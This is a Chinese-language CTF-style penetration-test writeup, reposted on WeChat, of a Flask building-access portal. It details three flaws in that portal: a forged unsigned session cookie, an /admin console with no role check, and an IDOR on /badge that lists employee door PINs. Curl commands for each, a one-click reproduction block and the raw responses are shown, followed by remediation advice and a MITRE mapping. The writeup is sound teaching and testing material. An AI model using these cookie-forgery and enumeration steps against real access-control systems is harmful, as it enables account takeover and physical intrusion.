---
title: Turnstile Ticketing Systems — 渗透测试
url: https://mp.weixin.qq.com/s/jkqK8IB9jKT1USFB0Xx3ww
source: Doonsec's feed
date: 2026-10-16
fetch_date: 2026-10-17T06:26:33.536156
---

# Turnstile Ticketing Systems — 渗透测试

# Turnstile Ticketing Systems — 渗透测试

网安之家-CyberHomestead

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# 東方既白Turnstile Ticketing Systems — 渗透测试 Writeup（逐字回显版）

> 目标 `http://45.79.214.27:30801/`（Flask/gunicorn 客户门户，物理门禁管理）。原始回显与请求来自 `/txt`、`/t/REPORT.md`。**未脱敏、未改写**。

## 0. 元信息

| 项 | 值 |
| --- | --- |
| 目标 | `http://45.79.214.27:30801/` |
| 应用 | "Building access portal"（建筑门禁门户，Flask + gunicorn） |
| 公开账号 | `demo` / `demo`（登录页 UI 直接给出） |
| 技术栈指纹 | `Server: gunicorn` 、`Content-Type: text/html; charset=utf-8`、Flask 风格 302 页 |
| 入口路由 | `/login``/dashboard``/badge``/admin``/logout` |
| 漏洞 | F-01 未签名会话 Cookie；F-02 BFLA `/admin`；F-03 IDOR `/badge?id=N` |
| flag 证明标记 | `flag{turnstile_broken_function_level_admin}` 、`flag{turnstile_idor_reads_any_badge}` |

## 1. 侦察

### 1.1 指纹与路由

• `/` → `302 /login`；匿名访问 `/admin``/dashboard``/logout` → `302 /login`。

• 非 404 的路由仅：`/login`、`/dashboard`、`/badge`、`/admin`、`/logout`。

• 登录页披露 demo 凭据 `demo` / `demo`。

• 工具：宿主无 nmap/ffuf/sqlmap，全部用 `curl` + shell/python 循环。

### 1.2 登录响应（原始）

`curl -i -c cj -X POST -d 'username=demo&password=demo' http://45.79.214.27:30801/login``#   Set-Cookie: turnstile_session=eyJ1aWQiOiAzLCAicm9sZSI6ICJlbXBsb3llZSJ9`

Cookie jar（`/tmp/opencode/bastion/cj.txt` 原始）：

`#HttpOnly_45.79.214.27 FALSE / FALSE 0 turnstile_session eyJ1aWQiOiAzLCAicm9sZSI6ICJlbXBsb3llZSJ9`

解码 `turnstile_session` = base64(`{"uid": 3, "role": "employee"}`) —— **无签名、无 MAC、无服务端会话存储**。

## 2. Findings（逐条）

### F-01 未签名会话 Cookie：身份可伪造（Critical）

**目标**：`POST /login` → `Set-Cookie: turnstile_session`；在 `/dashboard``/badge``/admin` 被消费
**成因**：Cookie 是纯 base64 的 JSON，携带**受信任的身份字段**`uid`/`role`，服务端逐字采信，无任何完整性校验。

**复现**：

`# 1) 以公开 demo 账号登录``curl -i -c cj -X POST -d 'username=demo&password=demo' http://45.79.214.27:30801/login``#   Set-Cookie: turnstile_session=eyJ1aWQiOiAzLCAicm9sZSI6ICJlbXBsb3llZSJ9``# 2) 解码 → {"uid": 3, "role": "employee"}（无签名）``# 3) 伪造管理员身份``COOKIE=$(printf'{"uid": 1, "role": "admin"}' | base64 -w0)   # eyJ1aWQiOiAxLCAicm9sZSI6ICJhZG1pbiJ9``curl -s http://45.79.214.27:30801/dashboard -b "turnstile_session=$COOKIE"``#   <h2>Signed in as j.reeves</h2> ... <b>Jordan Reeves</b> (Facilities)`

伪造 `uid=1..6` 可分别冒充 6 个不同员工（已实测：j.reeves/Facilities、m.osei/Engineering、l.tan/HR、d.kowalski/Finance、a.silva/Legal）。`role` 可任意取值；仅 `uid` 即可生效。
**影响**：完整认证绕过；任何基于 Cookie 身份的授权判断全部失效。
**CVSS 3.1**：`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` → **9.1 Critical**

### F-02 BFLA：任意已登录用户可达 `/admin` 主门控台（Critical）

**目标**：`GET /admin`
**成因**：`/admin` 渲染「Master door override console」，只校验「是否有会话」，**无角色校验**。最低权限的 `demo`（employee）可读。匿名被拦（`302 /login`），掩盖了缺失的函数级鉴权。

**复现**：

`curl -s http://45.79.214.27:30801/admin \``-b 'turnstile_session=eyJ1aWQiOiAzLCAicm9sZSI6ICJlbXBsb3llZSJ9'``# HTTP/1.1 200 OK  -> <h2>Master door override console</h2>``#   <tr><td class="k">Master door override</td><td>flag{turnstile_broken_function_level_admin}</td></tr>`

`POST /admin` → `405`；匿名 `GET /admin` → `302 /login`。
**影响**：任意员工（或用 F-01 伪造）获得门禁主控制——应用最高权限功能。
**CVSS 3.1**：`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` → **8.8 High**（因涉物理门禁，实际定级 Critical）

### F-03 IDOR：`/badge?id=N` 越权读任意员工徽章记录（High）

**目标**：`GET /badge?id=<N>`
**成因**：`/badge` 取客户端 `id` 直接返回对应记录，**不校验归属**。

**复现**：

`for i in 1 2 4 5 6 7; do``curl -s "http://45.79.214.27:30801/badge?id=$i" \``-b 'turnstile_session=eyJ1aWQiOiAzLCAicm9sZSI6ICJlbXBsb3llZSJ9'``done`

观察（节选）：

| id | 员工 | 部门 | 门禁 PIN | 备注 |
| --- | --- | --- | --- | --- |
| 1 | Jordan Reeves | Facilities | 4417 | Loading dock rear door… |
| 2 | Marcus Osei | Engineering | 8890 | Server room B escort required… |
| 4 | Lena Tan | HR | 3391 | HR floor turnstile logs… |
| 5 | Dawid Kowalski | Finance | 5567 | Vault antechamber badge… |
| 6 | Ana Silva | Legal | 2204 | Records room door… |
| 7 | Priya Nair | R&D | 9902 | Prototype lab access note: `flag{turnstile_idor_reads_any_badge}` |

`id` 被严格转为整数（非数字 → `400`），故无 SQLi；但**授权完全缺失**。负数/溢出 → `404`。
**影响**：批量泄露员工名册、部门、**门禁 PIN** 与敏感门禁备注（机房/金库/原型实验室/档案室），属凭据类数据，可用于物理入侵。
**CVSS 3.1**：`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` → **6.5 Medium**（因数据性质——门禁凭据，定级 High）

## 3. 其它观察（信息级）

• **Cookie 标志**：`HttpOnly` + `SameSite=Lax` 有，**无 `Secure`**，且无签名。

• **缺安全头**：无 `Content-Security-Policy`、`X-Frame-Options`/`frame-ancestors`、`Strict-Transport-Security`、`X-Content-Type-Options`、`Referrer-Policy`——可被 iframe 嵌套，无纵深防御。

• **技术泄露**：`Server: gunicorn`，无版本抑制。

• **未发现**：SQLi / 开放重定向 / 反射 XSS（登录参数化、失败统一 `"Invalid credentials."` 不回显用户名；`next`/`redirect` 被忽略；`/badge` id 整数化）。

## 4. 敏感信息清单

| 项 | 值 | 来源 |
| --- | --- | --- |
| demo 凭据 | `demo` / `demo` | 登录页 UI |
| 员工名册 | j.reeves, m.osei, l.tan, d.kowalski, a.silva, p.nair | F-03 枚举 |
| 门禁 PIN | 4417 / 8890 / 3391 / 5567 / 2204 / 9902 | `/badge?id=N` |
| flag 标记 | `flag{turnstile_broken_function_level_admin}` 、`flag{turnstile_idor_reads_any_badge}` | `/admin` 、`/badge?id=7` |

## 5. 攻击链总览（杀伤链）

`[侦察] GET / 指纹 gunicorn/Flask → 路由此 5 条；登录页得 demo/demo``▼``[立足] POST /login (demo/demo) → Set-Cookie turnstile_session=base64({uid:3,role:employee})``▼ F-01: 解码改 uid:1 role:admin 重编码 → 冒充管理员``[越权-纵向] F-02: GET /admin (低权 cookie 亦可) → flag{turnstile_broken_function_level_admin}``▼``[越权-横向] F-03: GET /badge?id=1..7 → 全员 PIN + flag{turnstile_idor_reads_any_badge}``▼``[影响] 门禁主控 + 全员门禁 PIN → 物理入侵`

## 6. 复现命令（一键）

`B=http://45.79.214.27:30801``# F-01 伪造身份``COOKIE=$(printf'{"uid": 1, "role": "admin"}' | base64 -w0)``curl -s $B/dashboard -b "turnstile_session=$COOKIE" | grep -i "Signed in as"``# F-02 低权访问 admin``curl -s $B/admin -b 'turnstile_session=eyJ1aWQiOiAzLCAicm9sZSI6ICJlbXBsb3llZSJ9' | grep -i override``# F-03 IDOR``curl -s "$B/badge?id=7" -b 'turnstile_session=eyJ1aWQiOiAzLCAicm9sZSI6ICJlbXBsb3llZSJ9' | grep -oiE 'flag\{[^}]*\}'`

## 7. 可能卡点 & 玄机

1. **Cookie 前缀**：实际 cookie 值在 header 里带 `HttpOnly_` 前缀（curl cookie jar），但 `-b` 传值时**不要**带前缀，只传 `turnstile_session=<base64>`。

2. **base64 无 padding**：`printf ... | base64 -w0` 生成，需注意个别长度会带 `=`；服务端能解析无 padding 变体。

3. **`role` 非必需**：仅改 `uid` 就能冒充；`role` 可乱填，别以为必须写 `admin`。

4. **`/admin` 匿名≠无洞**：匿名 302 会让人误判为「有鉴权」，实际只是「要登录」。必须用**低权已登录** cookie 复测。

5. **`/badge` 400/404**：非数字 400、越界 404 —— 这是**输入校验**在起作用，别当成授权校验；id 合法范围内（1–7+）全可越权。

## 8. 修复建议（按优先级）

1. **立即 F-01**：用服务端签名会话（Flask 默认 `itsdangerous` 签名 session，或服务端密钥签名的 JWT）；身份**只**从服务端会话读取；拒绝未签名/畸形 cookie；失效所有既有会话。

2. **立即 F-02**：对 `/admin` 及一切特权路由实施**默认拒绝**的服务端角色鉴权（不是「是否登录」）；用最低权限账号回归验证；审计与二次确认门禁操作。

3. **短期 F-03**：`/badge` 施加对象级鉴权（绑定 `session.uid`；用不可枚举 id）；对他人对象返回 `404` 而非 `403`。

4. **加固**：加 `Secure`；加 CSP/HSTS/X-Frame-Options/X-Content-Type-Options/Referrer-Policy；抑制 `Server` 版本；特权操作加审计日志。

## 9. MITRE ATT&CK 映射

| 阶段 | 技术 | ID |
| --- | --- | --- |
| 初始访问 | Valid Accounts: Default Accounts（demo/demo） | T1078.001 |
| 防御规避/提权 | Modify Authentication Process（客户端可控身份） | T1556 |
| 发现 | Account Discovery / 数据枚举 | T1087 |
| 收集 | Data from Information Repositories | T1213 |
| 影响 | 未授权物理访问（门禁控制） | T1667（近似） |

## 10. 下一步建议

• 该门户授权模型基本缺失，建议整体重构授权层。将「未签名 Cookie = 客户端可控身份」加入自动化检测用例。

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/RmVdn3aKDuf5wkAH0ibQUO3iaiaRkLPDaZ31RRtics7Vic5DGssJSBXpAG6wS0gF9yD0lbp6edicBkemKEHWHHncrjGg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过